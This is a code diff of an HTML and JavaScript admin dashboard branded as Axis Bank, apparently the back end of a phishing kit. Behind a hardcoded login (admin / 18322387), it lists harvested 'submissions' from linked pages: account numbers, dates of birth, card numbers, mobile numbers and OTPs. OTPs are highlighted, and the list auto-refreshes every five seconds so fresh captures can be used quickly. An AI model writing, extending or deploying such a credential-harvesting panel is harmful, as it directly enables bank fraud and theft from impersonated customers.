@@ -14,18 +14,18 @@
         
         body {
             background: #2c0b0e;
-            color: #fff;
             min-height: 100vh;
+            overflow-x: hidden;
         }
         
-        /* Password Protection Modal */
-        .login-modal {
+        /* Password Login */
+        .login-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.95);
+            background: #87103F;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -33,118 +33,87 @@
         }
         
         .login-box {
-            background: linear-gradient(135deg, #87103F 0%, #5a0c2a 100%);
-            padding: 40px;
-            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
             width: 90%;
-            max-width: 400px;
-            border: 3px solid #ff4757;
-            box-shadow: 0 0 30px rgba(255, 71, 87, 0.5);
-        }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
+            max-width: 350px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
         }
         
         .login-title {
-            font-size: 28px;
             color: white;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            margin-bottom: 10px;
-        }
-        
-        .login-subtitle {
-            color: #ffccd5;
-            font-size: 14px;
-        }
-        
-        .login-input-group {
+            text-align: center;
+            font-size: 24px;
             margin-bottom: 20px;
         }
         
-        .login-input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: white;
-            font-weight: bold;
-        }
-        
-        .login-input-group input {
+        .login-input {
             width: 100%;
             padding: 12px;
-            border: 2px solid #ff4757;
-            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 5px;
             background: rgba(255, 255, 255, 0.1);
             color: white;
             font-size: 16px;
         }
         
+        .login-input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
         .login-btn {
             width: 100%;
-            padding: 15px;
-            background: #ff4757;
-            color: white;
+            padding: 12px;
+            background: white;
+            color: #87103F;
             border: none;
-            border-radius: 8px;
+            border-radius: 5px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .login-btn:hover {
-            background: #ff2e43;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
         }
         
         .login-error {
             color: #ffcc00;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 10px;
+            font-size: 14px;
             display: none;
         }
         
-        /* Admin Panel Main */
+        /* Admin Panel */
         .admin-panel {
             display: none;
-            min-height: 100vh;
+            padding: 15px;
         }
         
-        .admin-header {
-            background: linear-gradient(135deg, #87103F 0%, #5a0c2a 100%);
-            padding: 20px;
-            border-bottom: 3px solid #ff4757;
-            box-shadow: 0 4px 20px rgba(135, 16, 63, 0.3);
-        }
-        
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .admin-title {
-            font-size: 24px;
+        /* Header */
+        .panel-header {
+            background: #87103F;
             color: white;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+        }
+        
+        .header-title {
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
         }
         
         .refresh-info {
-            background: rgba(255, 71, 87, 0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
+            text-align: center;
             font-size: 14px;
-            border: 1px solid #ff4757;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 5px;
         }
         
         .blink-dot {
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             background: #00ff00;
             border-radius: 50%;
             display: inline-block;
@@ -157,287 +126,180 @@
             50% { opacity: 0.3; }
         }
         
-        .stats-bar {
-            display: flex;
-            gap: 15px;
-            overflow-x: auto;
-            padding: 10px 0;
-        }
-        
-        .stat-card {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px 15px;
-            border-radius: 8px;
-            min-width: 120px;
-            border: 1px solid rgba(255, 71, 87, 0.3);
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ffcc00;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #ffccd5;
-        }
-        
-        /* Main Content */
-        .main-content {
-            padding: 20px;
-        }
-        
-        .submissions-title {
-            color: #ff4757;
-            font-size: 20px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
         /* Submissions List */
         .submissions-list {
-            max-height: 70vh;
+            max-height: 85vh;
             overflow-y: auto;
+            padding: 5px;
         }
         
         .submission-item {
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 71, 87, 0.2);
-            border-radius: 10px;
-            margin-bottom: 15px;
-            padding: 15px;
-            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 10px;
         }
         
         .submission-item.new {
-            background: rgba(135, 16, 63, 0.3);
-            border-left: 4px solid #ffcc00;
-            animation: highlightBlink 5s infinite;
+            background: #87103F;
+            border: 1px solid #ff4757;
+            animation: highlight 5s infinite;
         }
         
-        @keyframes highlightBlink {
+        @keyframes highlight {
             0%, 100% { 
-                background: rgba(135, 16, 63, 0.3);
-                border-color: #ffcc00;
+                background: #87103F;
+                border-color: #ff4757;
             }
             50% { 
-                background: rgba(135, 16, 63, 0.6);
-                border-color: #ff4757;
+                background: #a0144a;
+                border-color: #ff6b81;
             }
         }
         
         .submission-header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255, 71, 87, 0.2);
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         .page-name {
-            background: #87103F;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
             font-weight: bold;
-        }
-        
-        .page-name.otp {
-            background: #ff4757;
-        }
-        
-        .timestamp {
-            color: #ffccd5;
-            font-size: 12px;
-        }
-        
-        .submission-data {
-            margin-top: 10px;
-        }
-        
-        .data-row {
-            display: flex;
-            margin-bottom: 8px;
+            color: white;
             font-size: 14px;
         }
         
+        .timestamp {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .submission-data {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        .data-row {
+            margin-bottom: 4px;
+            word-break: break-all;
+        }
+        
         .data-label {
-            color: #ffccd5;
-            min-width: 120px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-right: 8px;
         }
         
         .data-value {
             color: white;
-            word-break: break-all;
+        }
+        
+        .data-value.otp {
+            color: #ff4757;
+            font-weight: bold;
         }
         
         .no-data {
             text-align: center;
             padding: 40px;
-            color: #888;
+            color: rgba(255, 255, 255, 0.5);
             font-style: italic;
         }
         
-        /* Logout Button */
-        .logout-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #ff4757;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            z-index: 100;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
-        }
-        
+        /* Responsive */
         @media (max-width: 768px) {
-            .stats-bar {
-                flex-wrap: nowrap;
-                overflow-x: auto;
+            .admin-panel {
+                padding: 10px;
             }
             
-            .stat-card {
-                min-width: 100px;
-            }
-            
-            .data-row {
+            .submission-header {
                 flex-direction: column;
+                gap: 4px;
             }
             
-            .data-label {
-                margin-bottom: 4px;
-                min-width: auto;
+            .page-name, .timestamp {
+                text-align: left;
+                width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Login Modal -->
-    <div class="login-modal" id="loginModal">
+    <!-- Password Login Screen -->
+    <div class="login-screen" id="loginScreen">
         <div class="login-box">
-            <div class="login-header">
-                <div class="login-title">ADMIN ACCESS</div>
-                <div class="login-subtitle">Axis Bank - Secure Admin Portal</div>
-            </div>
-            
-            <form id="loginForm">
-                <div class="login-input-group">
-                    <label for="username">User ID</label>
-                    <input type="text" id="username" name="username" placeholder="Enter admin user ID" required>
-                </div>
-                
-                <div class="login-input-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="Enter password" required>
-                </div>
-                
-                <button type="submit" class="login-btn">Login</button>
-                
-                <div class="login-error" id="loginError">
-                    Invalid credentials. Please try again.
-                </div>
-            </form>
+            <div class="login-title">ADMIN PANEL</div>
+            <input type="text" id="username" class="login-input" placeholder="User ID" autocomplete="off">
+            <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="off">
+            <button class="login-btn" onclick="login()">ENTER</button>
+            <div class="login-error" id="loginError">Invalid</div>
         </div>
     </div>
     
     <!-- Admin Panel -->
     <div class="admin-panel" id="adminPanel">
-        <header class="admin-header">
-            <div class="header-top">
-                <div class="admin-title">Axis Bank Admin Panel</div>
-                <div class="refresh-info">
-                    <span class="blink-dot"></span>
-                    Auto-refresh: <span id="refreshTimer">5</span>s
-                </div>
+        <!-- Header -->
+        <div class="panel-header">
+            <div class="header-title">📄 Submissions</div>
+            <div class="refresh-info">
+                <span class="blink-dot"></span>
+                Auto-refresh: <span id="refreshTimer">5</span>s
             </div>
-            
-            <div class="stats-bar">
-                <div class="stat-card">
-                    <div class="stat-value" id="totalSubmissions">0</div>
-                    <div class="stat-label">Total Submissions</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="todaySubmissions">0</div>
-                    <div class="stat-label">Today</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="indexCount">0</div>
-                    <div class="stat-label">Index Visits</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="otpCount">0</div>
-                    <div class="stat-label">OTP Pages</div>
-                </div>
-            </div>
-        </header>
+        </div>
         
-        <main class="main-content">
-            <h2 class="submissions-title">Recent Submissions</h2>
-            
-            <div class="submissions-list" id="submissionsList">
-                <!-- Submissions will load here -->
-                <div class="no-data">No submissions yet. Data will appear when users submit forms.</div>
-            </div>
-        </main>
-        
-        <button class="logout-btn" onclick="logout()">Logout</button>
+        <!-- Submissions List -->
+        <div class="submissions-list" id="submissionsList">
+            <div class="no-data">No submissions</div>
+        </div>
     </div>
 
     <script>
         // Admin Credentials
-        const ADMIN_USERNAME = "admin";
-        const ADMIN_PASSWORD = "18322387";
+        const ADMIN_USER = "admin";
+        const ADMIN_PASS = "18322387";
         
         let refreshInterval;
         let refreshTimer = 5;
         
-        // Check login status
+        // Check login
         document.addEventListener('DOMContentLoaded', function() {
-            const isLoggedIn = localStorage.getItem('adminLoggedIn');
-            
-            if (isLoggedIn === 'true') {
+            const savedLogin = localStorage.getItem('axisAdminLoggedIn');
+            if (savedLogin === 'true') {
                 showAdminPanel();
             }
             
-            // Setup login form
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-                    localStorage.setItem('adminLoggedIn', 'true');
-                    showAdminPanel();
-                } else {
-                    const errorElement = document.getElementById('loginError');
-                    errorElement.style.display = 'block';
-                    setTimeout(() => {
-                        errorElement.style.display = 'none';
-                    }, 3000);
-                }
+            // Enter key login
+            document.getElementById('password').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') login();
             });
         });
         
+        // Login function
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username === ADMIN_USER && password === ADMIN_PASS) {
+                localStorage.setItem('axisAdminLoggedIn', 'true');
+                showAdminPanel();
+            } else {
+                const errorEl = document.getElementById('loginError');
+                errorEl.style.display = 'block';
+                setTimeout(() => errorEl.style.display = 'none', 3000);
+            }
+        }
+        
+        // Show admin panel
         function showAdminPanel() {
-            document.getElementById('loginModal').style.display = 'none';
+            document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('adminPanel').style.display = 'block';
             loadSubmissions();
             startAutoRefresh();
         }
         
-        function logout() {
-            localStorage.removeItem('adminLoggedIn');
-            location.reload();
-        }
-        
+        // Auto refresh every 5 seconds
         function startAutoRefresh() {
             clearInterval(refreshInterval);
             refreshInterval = setInterval(() => {
@@ -451,75 +313,47 @@
             }, 1000);
         }
         
+        // Load submissions
         function loadSubmissions() {
-            // Get data from localStorage
             const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
-            
-            // Update statistics
-            updateStatistics(submissions);
-            
-            // Display submissions
             displaySubmissions(submissions);
         }
         
-        function updateStatistics(submissions) {
-            const total = submissions.length;
-            document.getElementById('totalSubmissions').textContent = total;
-            
-            // Today's submissions
-            const today = new Date().toDateString();
-            const todaySubs = submissions.filter(sub => {
-                const subDate = new Date(sub.timestamp).toDateString();
-                return subDate === today;
-            });
-            document.getElementById('todaySubmissions').textContent = todaySubs.length;
-            
-            // Index visits
-            const indexVisits = submissions.filter(sub => sub.page === 'index.html');
-            document.getElementById('indexCount').textContent = indexVisits.length;
-            
-            // OTP pages
-            const otpPages = submissions.filter(sub => 
-                sub.page.includes('otp') || 
-                (sub.data && sub.data.includes('OTP'))
-            );
-            document.getElementById('otpCount').textContent = otpPages.length;
-        }
-        
+        // Display submissions
         function displaySubmissions(submissions) {
             const container = document.getElementById('submissionsList');
             
             if (submissions.length === 0) {
-                container.innerHTML = '<div class="no-data">No submissions yet. Data will appear when users submit forms.</div>';
+                container.innerHTML = '<div class="no-data">No submissions</div>';
                 return;
             }
             
-            let html = '';
-            
             // Sort by timestamp (newest first)
             submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            let html = '';
             
             submissions.forEach((sub, index) => {
                 const time = new Date(sub.timestamp);
                 const timeString = time.toLocaleString();
                 
-                // Check if submission is new (within last 5 minutes)
+                // Check if new (within 5 minutes)
                 const isNew = (Date.now() - time.getTime()) < 5 * 60 * 1000;
                 
-                // Determine page type
-                const pageType = sub.page || 'Unknown';
-                const isOtpPage = pageType.includes('otp') || 
-                                 (sub.data && sub.data.includes('OTP')) ||
-                                 (sub.action && sub.action.includes('otp'));
+                // Get page name
+                const pageName = sub.page || 'Unknown';
+                
+                // Format data
+                const dataHtml = formatSubmissionData(sub);
                 
                 html += `
                     <div class="submission-item ${isNew ? 'new' : ''}">
                         <div class="submission-header">
-                            <span class="page-name ${isOtpPage ? 'otp' : ''}">${pageType}</span>
-                            <span class="timestamp">${timeString}</span>
+                            <div class="page-name">${pageName}</div>
+                            <div class="timestamp">${timeString}</div>
                         </div>
                         <div class="submission-data">
-                            ${formatSubmissionData(sub)}
+                            ${dataHtml}
                         </div>
                     </div>
                 `;
@@ -528,75 +362,48 @@
             container.innerHTML = html;
         }
         
-        function formatSubmissionData(submission) {
+        // Format submission data
+        function formatSubmissionData(sub) {
             let html = '';
             
-            // Format based on page type
-            if (submission.page === 'index.html') {
-                html += `
-                    <div class="data-row">
-                        <span class="data-label">Action:</span>
-                        <span class="data-value">${submission.action || 'Page Visit'}</span>
-                    </div>
-                    ${submission.userAgent ? `
-                    <div class="data-row">
-                        <span class="data-label">User Agent:</span>
-                        <span class="data-value" style="font-size: 12px;">${submission.userAgent.substring(0, 50)}...</span>
-                    </div>` : ''}
-                `;
-            } 
-            else if (submission.page === 'axis_account.html') {
-                html += `
-                    <div class="data-row">
-                        <span class="data-label">Account No:</span>
-                        <span class="data-value">${submission.accountNo || 'N/A'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Date of Birth:</span>
-                        <span class="data-value">${submission.dob || 'N/A'}</span>
-                    </div>
-                `;
+            // Show action
+            if (sub.action) {
+                html += `<div class="data-row"><span class="data-label">Action:</span> <span class="data-value">${sub.action}</span></div>`;
             }
-            else if (submission.page.includes('otp')) {
-                html += `
-                    <div class="data-row">
-                        <span class="data-label">Mobile:</span>
-                        <span class="data-value">${submission.mobileNumber || 'N/A'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">OTP:</span>
-                        <span class="data-value" style="color: #ff4757; font-weight: bold;">${submission.otp || 'N/A'}</span>
-                    </div>
-                `;
+            
+            // Show specific data based on page
+            if (sub.page === 'index.html') {
+                if (sub.userId) html += `<div class="data-row"><span class="data-label">User ID:</span> <span class="data-value">${sub.userId}</span></div>`;
+                if (sub.visitorType) html += `<div class="data-row"><span class="data-label">Type:</span> <span class="data-value">${sub.visitorType}</span></div>`;
+                if (sub.cardNumber) html += `<div class="data-row"><span class="data-label">Card:</span> <span class="data-value">${sub.cardNumber}</span></div>`;
             }
-            else {
-                // Generic display
-                for (const key in submission) {
-                    if (key !== 'timestamp' && key !== 'page') {
-                        html += `
-                            <div class="data-row">
-                                <span class="data-label">${key}:</span>
-                                <span class="data-value">${submission[key]}</span>
-                            </div>
-                        `;
+            else if (sub.page === 'axis_account.html') {
+                if (sub.accountNo) html += `<div class="data-row"><span class="data-label">Account:</span> <span class="data-value">${sub.accountNo}</span></div>`;
+                if (sub.dob) html += `<div class="data-row"><span class="data-label">DOB:</span> <span class="data-value">${sub.dob}</span></div>`;
+            }
+            else if (sub.page && sub.page.includes('otp')) {
+                if (sub.otp) html += `<div class="data-row"><span class="data-label">OTP:</span> <span class="data-value otp">${sub.otp}</span></div>`;
+                if (sub.mobileNumber) html += `<div class="data-row"><span class="data-label">Mobile:</span> <span class="data-value">${sub.mobileNumber}</span></div>`;
+            }
+            
+            // Show other data
+            for (const key in sub) {
+                if (!['page', 'timestamp', 'action', 'userId', 'visitorType', 'cardNumber', 
+                      'accountNo', 'dob', 'otp', 'mobileNumber'].includes(key)) {
+                    if (sub[key] && typeof sub[key] === 'string' && sub[key].length > 0) {
+                        html += `<div class="data-row"><span class="data-label">${key}:</span> <span class="data-value">${sub[key]}</span></div>`;
                     }
                 }
             }
             
-            return html;
+            return html || '<div class="data-row">No data</div>';
         }
         
-        // Add data saving function that other pages can use
-        window.saveFormData = function(data) {
-            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
-            submissions.unshift(data);
-            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
-        };
-        
-        // Initialize
-        if (localStorage.getItem('adminLoggedIn') === 'true') {
-            showAdminPanel();
-        }
+        // Auto-logout after 30 minutes
+        setTimeout(() => {
+            localStorage.removeItem('axisAdminLoggedIn');
+            location.reload();
+        }, 30 * 60 * 1000);
     </script>
 </body>
 </html>
